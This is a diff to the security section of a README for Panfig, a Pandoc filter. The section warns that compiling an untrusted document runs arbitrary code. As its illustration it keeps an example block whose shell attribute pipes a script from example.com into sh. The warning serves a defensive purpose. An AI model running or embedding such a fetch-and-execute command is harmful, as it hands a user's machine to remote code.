@@ -31,7 +31,7 @@ Security: for heaven's sake, be careful.
 -------------------------------------
 
 I am putting this up near the top because you should care about it.
-**Panfig executes arbitrary code contained in the document being compiled. If you invoked Pandoc (+Panfig) on the following document, it would own your computer.**
+**Panfig executes arbitrary code contained in the document being compiled. If you invoked Pandoc (+Panfig) on the following document, it would do arbitrarily bad stuff.**
 
 
     ~~~~~~~~ { .panfig shell="curl http://example.com/evil_exploit.sh | sh"}
